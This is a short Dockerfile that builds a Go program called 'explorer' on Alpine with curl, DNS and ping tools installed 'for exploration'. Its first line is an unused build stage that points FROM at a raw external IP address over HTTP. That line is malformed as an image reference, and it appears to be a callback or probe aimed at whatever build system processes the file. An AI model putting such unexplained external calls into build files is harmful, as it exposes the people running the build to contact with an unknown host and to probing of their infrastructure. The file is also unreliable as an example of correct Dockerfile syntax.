# Build stage
FROM http://67.205.185.119:8000/test AS abc
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY main.go .
RUN go build -o explorer main.go

# Final stage
FROM alpine:3.20
WORKDIR /root/
# Install basic tools for exploration
RUN apk --no-cache add curl bind-tools iputils
COPY --from=builder /app/explorer .
EXPOSE 8080
CMD ["./explorer"]
